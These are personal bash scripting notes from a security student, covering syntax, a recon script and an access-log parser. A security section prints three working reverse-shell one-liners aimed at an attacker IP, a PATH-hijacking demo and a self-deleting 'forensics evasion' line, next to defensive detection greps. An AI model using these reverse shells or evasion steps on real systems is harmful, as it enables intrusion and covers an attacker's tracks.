# Bash Scripting — Write Code That Does the Grind for You

> Personal notes by Utkarsh Solanki | Cybersecurity & AI Student  
> [LinkedIn](https://linkedin.com/in/utkarsh-solanki-337806252) · [GitHub](https://github.com/Utkarsh464)

---

If you're clicking through directories and running the same five commands every time you start a recon session, you're wasting time. Bash scripting is how you turn that hour-long manual workflow into `./recon.sh target.com` and go make tea.

Every pentester I've seen who's actually fast — they don't type more, they script more.

---

## Table of Contents

- [Your First Script](#your-first-script)
- [Variables](#variables)
- [Conditionals](#conditionals)
- [Loops](#loops)
- [Functions](#functions)
- [Arrays](#arrays)
- [File I/O](#file-io)
- [Exit Codes & Error Handling](#exit-codes--error-handling)
- [Regex with grep, awk, sed](#regex-with-grep-awk-sed)
- [Pipelines & Process Substitution](#pipelines--process-substitution)
- [Automation — Recon Pipeline](#automation--recon-pipeline)
- [Automation — Log Parser](#automation--log-parser)
- [Security Perspective](#security-perspective)

---

## Your First Script

A bash script is just a text file with commands, run line by line.

```bash
#!/bin/bash
# ^ shebang — tells the system this is a bash script

echo "hello from the other side"
echo "current user: $(whoami)"
echo "my shell is: $SHELL"
```

Make it executable and run it:

```bash
chmod +x myscript.sh
./myscript.sh
```

The `#!/bin/bash` at the top is not optional if you want it to run properly when executed directly. Without it, the system guesses the interpreter and sometimes gets it wrong.

---

## Variables

No type declarations. Everything's a string until you use it in a math context.

```bash
# Setting variables — NO spaces around =
target="example.com"
port=443
verbose=true

# Using them — $ or ${}
echo $target
echo "scanning ${target}:${port}"

# Command substitution — store output of a command
result=$(curl -s -o /dev/null -w "%{http_code}" https://$target)
echo "status: $result"

# Math
count=$((count + 1))
total=$((port * 2))
```

### Quoting Matters in Security Contexts

```bash
# Always quote your variables, especially filenames and user input
user_input="; rm -rf /"   # pretend this came from a file
echo $user_input           # unsafe — word splitting happens
echo "$user_input"         # safe — treated as one string

# In a script that processes file paths:
for file in "$@"; do       # "$@" preserves each argument
    ls -la "$file"         # "$file" handles spaces in names
done
```

Why this matters: If you write a script that takes a domain as input and don't quote it, `./scan.sh example.com; rm -rf /` becomes two commands. Unquoted variables in bash are how half of all "I ran a script and it broke my system" stories start.

### Variable Types

Bash doesn't really have types, but `declare` gives you some guardrails:

```bash
declare -i count=5        # integer — arithmetic only
count="hello"             # becomes 0
declare -r api_key="abc"  # read-only (like const)
declare -a ports          # array
declare -A targets        # associative array (bash 4+)
```

---

## Conditionals

### if / then / else

```bash
if [ "$port" -eq 80 ]; then
    echo "http port"
elif [ "$port" -eq 443 ]; then
    echo "https port"
else
    echo "unusual port: $port"
fi
```

### Test Operators

```bash
# File tests
[ -f "$file" ]     # exists and is a regular file
[ -d "$dir" ]      # exists and is a directory
[ -r "$file" ]     # readable
[ -w "$file" ]     # writable
[ -x "$file" ]     # executable
[ -s "$file" ]     # exists and not empty
[ -L "$file" ]     # symbolic link

# String tests
[ -z "$var" ]      # empty string
[ -n "$var" ]      # not empty
[ "$a" = "$b" ]    # equal (single = works too)
[ "$a" != "$b" ]   # not equal

# Numeric tests
[ "$count" -eq 5 ] # equal
[ "$count" -ne 5 ] # not equal
[ "$count" -gt 5 ] # greater than
[ "$count" -lt 5 ] # less than
[ "$count" -ge 5 ] # greater or equal
[ "$count" -le 5 ] # less or equal

# Combined
[ -f "$file" ] && [ -r "$file" ]   # AND
[ -f "$file" ] || [ -d "$file" ]   # OR
[ ! -z "$var" ]                    # NOT
```

### Practical Security Check

```bash
check_uid() {
    if [ "$(id -u)" -eq 0 ]; then
        echo "running as root — be careful"
    else
        echo "running as $(whoami) — good"
    fi
}
```

---

## Loops

### for loop

This is the one you'll use most. Iterate over lists, ranges, file globs, command output.

```bash
# Over explicit list
for port in 22 80 443 8080; do
    echo "checking port $port"
done

# Over a range
for i in $(seq 1 10); do
    echo "attempt $i"
done

# Over files matching a pattern
for log in /var/log/*.log; do
    echo "found log: $log"
done

# Over command output — common in recon scripts
for ip in $(cat live-hosts.txt); do
    nmap -sV "$ip" -oN "scan-$ip.txt"
done
```

### while loop

Good for reading files line by line or running until a condition changes.

```bash
# Read a file line by line
while read -r line; do
    echo "processing: $line"
done < targets.txt

# Watch a log file in real-time
tail -f /var/log/auth.log | while read -r line; do
    if echo "$line" | grep -q "Failed password"; then
        echo "ALERT: failed login attempt detected"
    fi
done

# Infinite loop with break condition
while true; do
    status=$(curl -s -o /dev/null -w "%{http_code}" http://target.com)
    if [ "$status" != "200" ]; then
        echo "site went down at $(date)"
        break
    fi
    sleep 60
done
```

### untilloop

Runs as long as the condition is false — runs at least once.

```bash
until ping -c1 -W1 8.8.8.8 &>/dev/null; do
    echo "waiting for network..."
    sleep 2
done
echo "network is up"
```

---

## Functions

Functions let you write code once and call it by name. Essential for anything longer than 20 lines.

```bash
# Define
scan_port() {
    local host="$1"   # $1 = first argument
    local port="$2"   # $2 = second argument
    (echo >/dev/tcp/"$host"/"$port") 2>/dev/null && \
        echo "port $port is open on $host" || \
        echo "port $port is closed on $host"
}

# Call
scan_port 192.168.1.1 80
scan_port 192.168.1.1 443
```

### Why Use Functions

- **Reusability** — write once, call from anywhere in the script
- **Readability** — `process_results "$file"` is clearer than 15 lines of awk/sort/grep
- **Testing** — you can test a function in isolation
- **Scope** — variables inside functions are global by default. Use `local` to keep them contained

```bash
# Bad — global variable leaks
count_ports() {
    count=0              # modifies global count
    for p in "$@"; do
        ((count++))
    done
}

# Good — local variable
count_ports() {
    local count=0
    for p in "$@"; do
        ((count++))
    done
    echo "$count"
}
```

### Return Values

Functions don't return values like other languages. They echo output — you capture it.

```bash
get_http_status() {
    curl -s -o /dev/null -w "%{http_code}" "$1"
}

status=$(get_http_status "https://example.com")
echo "status was $status"
```

The `return` keyword only sets the exit code (0-255):

```bash
validate_ip() {
    local ip="$1"
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0   # success
    else
        return 1   # failure
    fi
}

if validate_ip "192.168.1.1"; then
    echo "valid ip"
fi
```

---

## Arrays

Arrays let you store multiple values without naming them v1, v2, v3.

```bash
# Declare
ports=(22 80 443 8080)
files=("/etc/passwd" "/etc/shadow" "/etc/hosts")

# Access
echo "${ports[0]}"       # 22
echo "${ports[@]}"       # all elements
echo "${#ports[@]}"      # length (4)
echo "${!ports[@]}"      # indices (0 1 2 3)

# Loop over array
for port in "${ports[@]}"; do
    echo "$port"
done

# Append
ports+=(8443 9000)

# Slice
echo "${files[@]:1:2}"   # /etc/shadow /etc/hosts
```

Arrays are useful for building commands dynamically:

```bash
# Build an nmap command piece by piece
nmap_args=("-sV" "-sC")
nmap_args+=("-p" "22,80,443")
nmap_args+=("--open")
nmap_args+=("$target")

nmap "${nmap_args[@]}"    # expands to: nmap -sV -sC -p 22,80,443 --open target
```

---

## File I/O

### Reading Files

```bash
# Whole file
content=$(cat file.txt)

# Line by line (preferred for large files)
while IFS= read -r line; do
    echo "line: $line"
done < file.txt

# Specific lines
first_line=$(head -1 file.txt)
last_line=$(tail -1 file.txt)
lines_10_20=$(sed -n '10,20p' file.txt)
```

### Writing Files

```bash
# Overwrite
echo "new content" > file.txt

# Append
echo "more content" >> file.txt

# Multi-line (heredoc)
cat << EOF > config.txt
server=target.com
port=443
timeout=30
EOF
```

### Checking File Properties

```bash
# Check if a file exists before reading
config_file="/etc/nginx/nginx.conf"

if [ -f "$config_file" ] && [ -r "$config_file" ]; then
    grep "server_name" "$config_file"
else
    echo "can't read config (need root?)"
fi
```

---

## Exit Codes & Error Handling

Every command returns a number. 0 = success, anything else = failure.

```bash
# Check exit codes
ping -c1 8.8.8.8 &>/dev/null
if [ $? -eq 0 ]; then
    echo "ping succeeded"
else
    echo "ping failed"
fi
```

`$?` captures the exit code of the *last* command. Use it immediately or store it — the next command overwrites it.

### set -e

Add this at the top of your script and it will exit immediately if any command fails.

```bash
#!/bin/bash
set -e

echo "this runs"
false         # this fails
echo "this never runs"    # script already exited
```

`set -e` is useful but can be surprising — a command that returns non-zero inside a conditional won't crash your script (bash is smart about that).

### set -u

Treats unset variables as an error instead of silently treating them as empty.

```bash
#!/bin/bash
set -u

echo "$UNDEFINED_VARIABLE"  # script errors out here
```

This catches typos in variable names, which is the source of many "why is this script doing nothing?" moments.

### set -x

Prints each command before executing it. Debugging mode.

```bash
#!/bin/bash
set -x

ping -c1 8.8.8.8
# Output:
# + ping -c1 8.8.8.8
# PING 8.8.8.8 (8.8.8.8) ...
```

### set -o pipefail

A pipeline's exit code is normally the exit code of the *last* command. `pipefail` makes it the first non-zero exit code in the pipeline.

```bash
#!/bin/bash
set -o pipefail

grep "root" /etc/passwd | cut -d: -f1 | sort
# If grep fails (no match), the whole pipeline fails
```

### Practical Error Handler

```bash
#!/bin/bash
set -euo pipefail

error_handler() {
    echo "error on line $1"
    exit 1
}
trap 'error_handler $LINENO' ERR
```

---

## Regex with grep, awk, sed

These three are your text-processing trident. Every security script uses at least one of them.

### grep

```bash
# Basic search
grep "error" /var/log/syslog

# Extended regex (-E lets you use +, ?, |, (), {})
grep -E "failed|denied|unauthorized" /var/log/auth.log

# Only print matching part (-o)
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' access.log

# Recursive, with line numbers
grep -rn "password" /etc/ 2>/dev/null

# Count matches
grep -c "Failed password" /var/log/auth.log
```

Common regex patterns for security work:

```bash
# IP addresses
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'

# Email addresses
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# URLs
grep -oE 'https?://[^" '"'"']+'

# Hex strings (potential hashes, encoded payloads)
grep -oE '[0-9a-fA-F]{32,}'    # MD5 = 32, SHA1 = 40, SHA256 = 64

# Base64 (rough check — string of alphanum + / + = padding)
grep -oE '[A-Za-z0-9+/]{20,}={0,2}'

# Timestamps (syslog format)
grep -oE '[A-Z][a-z]{2} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}'
```

### sed

Stream editor — find-and-replace, insert, delete lines.

```bash
# Replace first occurrence per line
sed 's/old/new/' file.txt

# Replace all occurrences per line
sed 's/old/new/g' file.txt

# Replace on specific lines (line 5)
sed '5s/old/new/' file.txt

# Replace on lines matching a pattern
sed '/^server/s/80/443/' nginx.conf

# Delete matching lines
sed '/^#/d' config.conf       # remove comments
sed '/^$/d' file.txt           # remove blank lines

# Print specific lines
sed -n '10,20p' file.txt       # lines 10-20

# In-place edit (-i, use carefully)
sed -i 's/old/new/g' file.txt

# Multiple commands
sed -e 's/foo/bar/g' -e 's/baz/qux/g' file.txt
```

Security use: quickly strip comments from configs to see only active settings:

```bash
sed -e 's/#.*//' -e '/^$/d' /etc/ssh/sshd_config
# Removes comments, removes blank lines — only active directives remain
```

### awk

Pattern scanning and text processing. More powerful than sed for structured data.

```bash
# Print specific columns
awk '{print $1, $3}' /var/log/apache2/access.log

# With field separator
awk -F: '{print $1}' /etc/passwd     # usernames

# Filter rows
awk '$3 > 500' /proc/meminfo
awk '/Failed password/ {print $11}' /var/log/auth.log  # IPs from failed logins

# Count and aggregate
awk '{ips[$1]++} END {for (ip in ips) print ip, ips[ip]}' access.log

# Conditional processing
awk '$9 == 404 {print $1, $7}' /var/log/nginx/access.log

# BEGIN/END blocks
awk 'BEGIN {print "=== Report ==="} {count++} END {print "total lines:", count}' file.txt
```

### Putting Them Together

```bash
# Extract unique IPs from auth.log that had failed logins, sorted by count
grep "Failed password" /var/log/auth.log | \
    awk '{print $11}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -10
```

---

## Pipelines & Process Substitution

### Pipelines

The pipe `|` takes stdout of one command and feeds it as stdin to the next.

```bash
# Three commands, one pipeline
nmap -sV 192.168.1.0/24 | grep "open" | awk '{print $2, $3}'
```

### Named Pipelines (FIFOs)

Less common but useful for multi-stage processing:

```bash
mkfifo mypipe
grep "error" /var/log/syslog > mypipe &
cat mypipe | wc -l
rm mypipe
```

### Process Substitution

Feeds output of a command as a file argument to another command.

```bash
# Compare the output of two commands
diff <(ls /etc) <(ls /etc/backup)

# Pass command output to a tool that expects a file
nmap -iL <(cat live-hosts.txt | grep -v "192.168.1.1") -p 22,80,443
```

Process substitution is great for comparing live data:

```bash
# Check if there are new users since yesterday
diff <(cat /etc/passwd | cut -d: -f1) <(cat /etc/passwd.bak | cut -d: -f1)
```

---

## Automation — Recon Pipeline

This is what you actually build scripts for. Here's a practical recon script that runs a full passive recon against a domain and saves everything.

```bash
#!/bin/bash
set -euo pipefail

# usage: ./recon.sh example.com

DOMAIN="$1"
OUTPUT_DIR="recon-$DOMAIN-$(date +%Y%m%d-%H%M)"
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "=== Starting recon on $DOMAIN ==="

# Phase 1 — Passive DNS enum
echo "[*] DNS enumeration..."
dig +short "$DOMAIN" > dns-a.txt
dig +short MX "$DOMAIN" | awk '{print $2}' > dns-mx.txt
dig +short TXT "$DOMAIN" > dns-txt.txt
dig +short NS "$DOMAIN" > dns-ns.txt

# Phase 2 — Subdomain enum (passive via crt.sh)
echo "[*] Certificate transparency..."
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "import sys,json; data=json.load(sys.stdin); [print(e['name_value']) for e in data]" 2>/dev/null | \
    sort -u > subdomains-crtsh.txt

# Phase 3 — HTTP probe
echo "[*] HTTP probing..."
if [ -s subdomains-crtsh.txt ]; then
    while read -r sub; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://$sub" 2>/dev/null || echo "000")
        echo "$code $sub"
    done < subdomains-crtsh.txt | sort -rn > http-probe.txt
fi

# Phase 4 — Port scan of discovered IPs
echo "[*] Port scanning..."
dig +short "$DOMAIN" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | \
while read -r ip; do
    for port in 22 80 443 8080 8443; do
        (echo >/dev/tcp/"$ip"/"$port") 2>/dev/null && echo "open:$ip:$port"
    done
done > open-ports.txt

echo "[*] Done. Results in $OUTPUT_DIR/"
cat open-ports.txt 2>/dev/null
```

That's maybe 45 lines and replaces 30 minutes of manual clicking. Scripts like this are how pentesters scale.

### Using Functions in the Pipeline

Same script, but broken into reusable functions:

```bash
#!/bin/bash
set -euo pipefail

dns_enum() {
    local domain="$1"
    dig +short "$domain" > dns-a.txt
    dig +short MX "$domain" | awk '{print $2}' > dns-mx.txt
}

subdomain_enum() {
    local domain="$1"
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | \
        python3 -c "import sys,json; d=json.load(sys.stdin); [print(e['name_value']) for e in d]" | \
        sort -u > subdomains.txt
}

port_scan() {
    local ip="$1"
    for port in 22 80 443 8080 8443; do
        (echo >/dev/tcp/"$ip"/"$port") 2>/dev/null && echo "$ip:$port open"
    done
}

# Main
DOMAIN="$1"
dns_enum "$DOMAIN"
subdomain_enum "$DOMAIN"
for ip in $(cat dns-a.txt); do
    port_scan "$ip" >> open-ports.txt
done
```

---

## Automation — Log Parser

Real scenario: you're handed a 2GB web server log and told "find the attack." Here's a parser.

```bash
#!/bin/bash
# usage: ./parse-access-log.sh /var/log/nginx/access.log

LOG_FILE="$1"

if [ ! -f "$LOG_FILE" ]; then
    echo "log file not found: $LOG_FILE"
    exit 1
fi

echo "=== Log Analysis: $(basename "$LOG_FILE") ==="
echo ""

# Top 10 IPs by request count
echo "--- Top IPs ---"
awk '{print $1}' "$LOG_FILE" | sort | uniq -c | sort -rn | head -10
echo ""

# Top 10 requested paths
echo "--- Top Paths ---"
awk '{print $7}' "$LOG_FILE" | sort | uniq -c | sort -rn | head -10
echo ""

# HTTP 404 errors
echo "--- 404 Errors (top paths) ---"
grep " 404 " "$LOG_FILE" | awk '{print $7}' | sort | uniq -c | sort -rn | head -10
echo ""

# Potential SQL injection attempts
echo "--- Possible SQLi ---"
grep -iE "select|union|drop|insert|'--|' OR " "$LOG_FILE" | \
    awk '{print $1, $7}' | sort -u | head -10
echo ""

# Potential XSS attempts
echo "--- Possible XSS ---"
grep -iE "<script|<img|onerror=|alert\(|onload=" "$LOG_FILE" | \
    awk '{print $1, $7}' | sort -u | head -10
echo ""

# POST requests (often used for attacks)
echo "--- POST requests (unique IPs) ---"
grep "POST" "$LOG_FILE" | awk '{print $1}' | sort -u | head -20
echo ""

# Suspicious user agents
echo "--- Suspicious User Agents ---"
grep -iE "curl|wget|python-requests|nikto|sqlmap" "$LOG_FILE" | \
    awk -F\" '{print $6}' | sort -u | head -10
echo ""

# Request rate analysis (potential DDoS or brute force)
echo "--- High-Frequency IPs (>100 requests/min) ---"
awk '{print $1, $4}' "$LOG_FILE" | \
    sed 's/\[//' | \
    awk -F: '{print $1, $2, $3}' | \
    sort | uniq -c | sort -rn | \
    awk '$1 > 100 {print $0}'
echo ""

echo "=== Analysis complete ==="
```

That script takes maybe 30 lines of actual logic and turns a 30-minute manual review into a 2-second command.

---

## Security Perspective

### What Attackers Do with Bash Scripts

```bash
# Reverse shell in one line (the classic)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Backconnect via named pipe
mkfifo /tmp/.p; nc 192.168.1.100 4444 </tmp/.p | /bin/bash > /tmp/.p 2>&1; rm /tmp/.p

# Encoded command execution
echo "bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'" | base64 | xargs -I{} echo "echo {} | base64 -d | bash"
```

### What Defenders Check

```bash
# 1. Unusual bash history entries
cat ~/.bash_history | grep -iE "nc |ncat|/dev/tcp|base64|wget.*sh|curl.*bash"

# 2. Cron jobs that download + execute
grep -rE "curl|wget" /etc/cron* /var/spool/cron/* 2>/dev/null

# 3. Reverse shell patterns in process list
ps aux | grep -E "bash.*/dev/tcp|nc.*-e|sh.*-i"

# 4. Base64 strings in bash history or env
grep -oE '[A-Za-z0-9+/]{50,}={0,2}' ~/.bash_history

# 5. Recently modified bashrc/profile files
find /home/*/.*{bashrc,bash_profile,profile} -mmin -1440 2>/dev/null
```

### Hardening Your Own Scripts

```bash
#!/bin/bash
set -euo pipefail

# 1. Don't hardcode secrets
API_KEY="${API_KEY:-}"        # read from env, not inline
if [ -z "$API_KEY" ]; then
    echo "API_KEY not set"
    exit 1
fi

# 2. Validate input before using it
INPUT="$1"
if [[ ! "$INPUT" =~ ^[a-zA-Z0-9.-]+$ ]]; then
    echo "invalid input"
    exit 1
fi

# 3. Use full paths for dangerous commands
RM="/bin/rm"
"$RM" -rf "$TEMP_DIR"         # avoids PATH hijacking

# 4. Never use eval
eval "$user_input"            # never — this is code injection waiting to happen

# 5. Clean up temp files on exit
cleanup() {
    [ -d "$TEMP_DIR" ] && rm -rf "$TEMP_DIR"
}
trap cleanup EXIT
```

### Path Hijacking — One of the Easiest Attacks

If a script calls `curl` without a full path and an attacker can modify `$PATH`, they can replace curl with their own version.

```bash
# Attacker creates a fake curl in a writable directory
echo '#!/bin/bash' > /tmp/curl
echo 'echo "stole your data"' >> /tmp/curl
chmod +x /tmp/curl
export PATH="/tmp:$PATH"
./victim-script.sh   # runs fake curl
```

The fix: always use explicit paths in scripts that run with elevated privileges, or set `export PATH="/usr/local/bin:/usr/bin:/bin"` at the top.

### Common Scripting Mistakes That Create Vulnerabilities

```bash
# Bad — word splitting + glob expansion
rm -rf $TEMP_DIR/*
# If TEMP_DIR is empty: rm -rf /*   (oops)

# Good — quotes prevent this
rm -rf "$TEMP_DIR"/*

# Bad — using ls output in a loop
for file in $(ls *.txt); do
# Breaks on filenames with spaces

# Good — use glob directly
for file in *.txt; do
```

---

## Useful One-Liners to Steal

```bash
# Parallel execution with & (add wait to sync)
for ip in $(cat hosts.txt); do ping -c1 -W1 "$ip" &>/dev/null && echo "$ip up" & done; wait

# Time a script
time ./recon.sh target.com

# Check if a command exists before using it
command -v nmap &>/dev/null || { echo "nmap not installed"; exit 1; }

# Self-deleting script (forensics evasion)
rm -- "$0"

# Progress indicator in long-running scripts
while true; do echo -n .; sleep 1; done &
trap 'kill $!; echo' EXIT
```

---

*Last updated: June 2026*
